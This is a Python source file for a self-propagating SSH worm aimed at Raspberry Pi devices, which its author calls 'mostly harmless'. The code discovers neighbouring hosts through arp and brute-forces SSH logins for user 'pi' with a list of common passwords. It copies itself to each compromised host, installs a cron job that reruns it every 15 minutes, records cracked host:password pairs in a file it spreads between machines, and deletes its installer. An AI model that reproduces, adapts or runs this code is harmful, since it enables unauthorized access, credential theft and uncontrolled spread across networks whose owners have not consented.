import paramiko, socket, time, subprocess, sys, os, copy, datetime

__author__ = "Marcio Castillo"
__license__ = "MIT"

# A mostly harmless worm made for the raspberry pi. It will attempt to connect 
# via ssh (port 22) to hosts it received from arp (Address Resolution Protocol).
# When successful it will save known remote hosts and passwords to a hosts.txt 
# file for faster future reconnections. This worm will primary attempt to brute 
# force the ssh port with a wordlist for the raspberry pi and repeat the process 
# every 15 minutes via the saved cron job.

# rest periods for worm and errors
REST_PERIOD = 60
REST_PERIOD_ERRORS = 30
REST_HOST_RECONNECT = 10

# default and common passwords
wordlist = [
    "raspberry",
    "root",
    "toor",
    "123456",
    "iloveyou",
    "qwerty",
    "abc123",
    "password",
    "password1",
    "passw0rd"
]

# check local hosts.txt file for faster reconnection
def check_host_file(hosts):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    new_hosts = copy.deepcopy(hosts)

    # check if hosts file exists
    if os.path.exists("/home/pi/worm/hosts.txt"):
        # read local hosts file
        f = open("/home/pi/worm/hosts.txt", "r")
        lines = f.readlines()
        f.close()
        
        for host in hosts:
            for line in lines:
                try:
                    h, pw = line.strip().split(":") # pull hosts and password
                    if h == host: # found the same host
                        client.connect(hostname=h, port=22, username="pi", password=pw, banner_timeout=30, timeout=30, auth_timeout=30)
                        stdin, stdout, stderr = client.exec_command("crontab -l")
                        time.sleep(5)

                        out = stdout.read().decode().strip()
                        
                        if out == "" or out == None:
                            # create folder if it doesnt exists
                            stdin, stdout, stderr = client.exec_command("/usr/bin/test -d /home/pi/worm && echo 'found' || mkdir /home/pi/worm")
                            time.sleep(5)
            
                            # drop or re-drop worm
                            sftp = client.open_sftp()
                            sftp.put("/home/pi/worm/worm.py", "/home/pi/worm/worm.py")
                            sftp.close()

                            # check if remote hosts file exists 
                            stdin, stdout, stderr = client.exec_command("/usr/bin/test -f /home/pi/worm/hosts.txt && echo 'found'")
                            time.sleep(5)
                            out = stdout.read().decode().strip()

                            # if remote hosts file exists and doesnt have this host:passwordappend to it
                            if out == "found":
                                stdin, stdout, stderr = client.exec_command("cat /home/pi/hosts.txt")
                                time.sleep(5)
                                out = stdout.read().decode().strip()
                                hosts_file = out.split("\n")

                                add_host = True

                                for i in hosts_file:
                                    try:
                                        if i == ""  or i == None: 
                                            continue
                                        h2, p = i.strip().split(":")
                                        if h2 == host:
                                            # you already have this host saved
                                            add_host = False
                                            break
                                    except Exception as err:
                                        if os.path.exists("/home/pi/worm"):
                                            f = open("/home/pi/worm/errors.txt", "a")
                                            f.write("Host file error: {}\n".format(err))
                                            f.close()

                                if add_host:
                                    stdin, stdout, stderr = client.exec_command("echo '{}:{}' >> /home/pi/worm/hosts.txt".format(host, pw))
                                    time.sleep(5)

                            else:
                                # no remote hosts file found, so copy local hosts file
                                sftp = client.open_sftp()
                                sftp.put("/home/pi/worm/hosts.txt", "/home/pi/worm/hosts.txt")
                                sftp.close()

                            # add crontab job which will run worm in background every 15 minutes
                            stdin, stdout, stderr = client.exec_command("echo '*/15 * * * * python3 /home/pi/worm/worm.py' > command.txt; crontab -u pi command.txt; rm command.txt; /usr/bin/pip3 install paramiko")
                            time.sleep(5)

                        # remove current host from list
                        new_hosts.remove(h)
                        break
          
                except Exception as err:
                    print("Problem with host file on remote hosts: {}:{} => {}\n".format(host, pw, err))
                    os.makedirs(os.path.dirname("/home/pi/worm/errors.txt"), exist_ok=True)
                    with open("/home/pi/worm/errors.txt", "a") as f:
                        f.write("Problem with host file on remote hosts: {}:{} => {}\n".format(host, pw, err))
                    time.sleep(REST_HOST_RECONNECT)

    # done
    client.close()
    return new_hosts

# attempt to connect via wordlist
def connect_and_drop_worm(hosts):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    for host in hosts:
        for pw in wordlist:
            try:
                client.connect(hostname=host, port=22, username="pi", password=pw, banner_timeout=30, timeout=30, auth_timeout=30)
                # check if worm is active
                stdin, stdout, stderr = client.exec_command("crontab -l")
                time.sleep(5)
                out = stdout.read().decode().strip()

                # add this (assumed) new host:password to the local hosts file
                if os.path.exists("/home/pi/worm"):
                    f = open("/home/pi/worm/hosts.txt", "a")
                    f.write("{}:{}\n".format(host, pw))
                    f.close()

                # if worm isnt active drop worm again and reactive
                if out == "" or out  == None:
                    stdin, stdout, stderr = client.exec_command("/usr/bin/test -d /home/pi/worm && echo 'found' || mkdir /home/pi/worm")
                    time.sleep(5)

                    # drop worm
                    sftp = client.open_sftp()
                    sftp.put("/home/pi/worm/worm.py", "/home/pi/worm/worm.py")
                    sftp.close()

                    # check if remote hosts file exists
                    stdin, stdout, stderr = client.exec_command("/usr/bin/test -f /home/pi/worm/hosts.txt && echo 'found'")
                    time.sleep(5)
                    out = stdout.read().decode().strip()

                    # if it exists try to append host:password to the remote hosts file
                    if out == "found":
                        stdin, stdout, stderr = client.exec_command("cat /home/pi/hosts.txt")
                        time.sleep(5)
                        out = stdout.read().decode().strip()
                        hosts_file = out.split("\n")

                        add_host = True

                        for i in hosts_file:
                            try:
                                if i == ""  or i == None: 
                                    continue

                                h2, pw2 = i.strip().split(":")

                                if h2 == host:
                                    print("you already have this host")
                                    add_host = False
                                    break

                            except Exception as err:
                                print("Cannot save to hosts file with host {}: {}".format(host, err))

                        if add_host:
                            # add to host file
                            stdin, stdout, stderr = client.exec_command("echo '{}:{}' >> /home/pi/worm/hosts.txt".format(host, pw))
                            time.sleep(5)

                    else:
                        # copy this local hosts file to the remote host
                        sftp = client.open_sftp()
                        sftp.put("/home/pi/worm/hosts.txt", "/home/pi/worm/hosts.txt") 
                        sftp.close()               

                    # add crontab job which will run worm in background every 15 minutes
                    stdin, stdout, stderr = client.exec_command("echo '*/15 * * * * python3 /home/pi/worm/worm.py' > command.txt; crontab -u pi command.txt; rm command.txt; /usr/bin/pip3 install paramiko;")
                    time.sleep(5)
                    #out = stdout.read().decode().strip()

                # go to the next host
                break

            except Exception as err:
                print("Problem connecting to {}:{} =>".format(host, pw), err)
                os.makedirs(os.path.dirname("/home/pi/worm/errors.txt"), exist_ok=True)
                with open("/home/pi/worm/errors.txt", "a") as f:
                    f.write("Problem connecting to {}:{} => {}\n".format(host, pw, err))
                time.sleep(REST_HOST_RECONNECT)
    
    client.close()

# check if ssh (port 22) is open
def ssh_port_checker(ip):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a_socket.settimeout(10)
    location = (ip, 22)
    result_of_check = a_socket.connect_ex(location)

    if result_of_check == 0:
        # Port is open
        return True
    else:
        # Port is closed
        return False

# return active hosts with open ssh ports (port 22) 
def get_active_hosts():
    output = subprocess.Popen("/usr/sbin/arp -a", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True, executable="/bin/bash")
    data = output.stdout.read().decode("utf-8").split("\n")
    
    hosts = []
    for i in data:
        tmp = i.split(" ")
        if len(tmp) >= 2:
            tmp2 = tmp[1] # get ip address
            hosts.append(tmp2.replace("(", "").replace(")", "").strip()) # remove () from ip address

    ssh_hosts = []

    # get host with open ssh ports 
    for ip in hosts:
        if ssh_port_checker(ip):
            ssh_hosts.append(ip)

    return ssh_hosts

# get active hosts then attempt to connect, check and drop worm
def connect_to_hosts():
    hosts = get_active_hosts()

    if len(hosts) >= 1:
        hosts = check_host_file(hosts)
        connect_and_drop_worm(hosts)
    else:
        os.makedirs(os.path.dirname("/home/pi/worm/errors.txt"), exist_ok=True)
        with open("/home/pi/worm/errors.txt", "a") as f:
            f.write("No hosts found after get_active_hosts() was called...\n")

# install worm in the /home/pi/worm directory, add crontab job, drop the worm,
# activate worm, and then delete worm file if it is in the wrong location
def install_worm():
    path = os.getcwd() + "/" + sys.argv[0]
    f = open(path, "r")
    lines = f.readlines()
    f.close()

    os.mkdir("/home/pi/worm")
    os.makedirs(os.path.dirname("/home/pi/worm/worm.py"), exist_ok=True)
    with open("/home/pi/worm/worm.py", "w") as f:
        f.write("{}".format("".join(lines)))

    subprocess.Popen("echo '*/15 * * * * python3 /home/pi/worm/worm.py' > command.txt; crontab -u pi command.txt; rm command.txt; nohup python3 /home/pi/worm/worm.py > /dev/null 2>&1 &", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True, executable="/bin/bash")

    # save current host's ip and password if given in the args (recommended)
    if len(sys.argv) == 3:
        os.makedirs(os.path.dirname("/home/pi/worm/hosts.txt"), exist_ok=True)
        with open("/home/pi/worm/hosts.txt", "a") as f:
            f.write("{}:{}\n".format(sys.argv[1], sys.argv[2]))

    # remove this file
    os.remove("{}/{}".format(os.getcwd(), sys.argv[0]))
    sys.exit()

# clear duplicate hosts (host:password)
def clear_dup_hosts():
    if os.path.exists("/home/pi/worm/hosts.txt"):
        subprocess.Popen("sort -u /home/pi/worm/hosts.txt -o /home/pi/worm/hosts.txt", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True, executable="/bin/bash")

def log_timestamp():
    current_time = datetime.datetime.now()
    os.makedirs(os.path.dirname("/home/pi/worm/logs.txt"), exist_ok=True)
    with open("/home/pi/worm/logs.txt", "a") as f:
        f.write("{}\n".format(str(current_time)))

if __name__ == "__main__":
    try:
        if os.path.exists("/home/pi/worm/worm.py"):
            connect_to_hosts()
        else:
            install_worm()

        # clear duplicate hosts
        clear_dup_hosts() 

        # rest period for this worm
        time.sleep(REST_PERIOD)

        # log time & date
        log_timestamp()

    except Exception as err:
        print("Main:", err)
        os.makedirs(os.path.dirname("/home/pi/worm/errors.txt"), exist_ok=True)
        with open("/home/pi/worm/errors.txt", "a") as f:
            f.write("MAIN: {}\n".format(err))
        time.sleep(REST_PERIOD_ERRORS)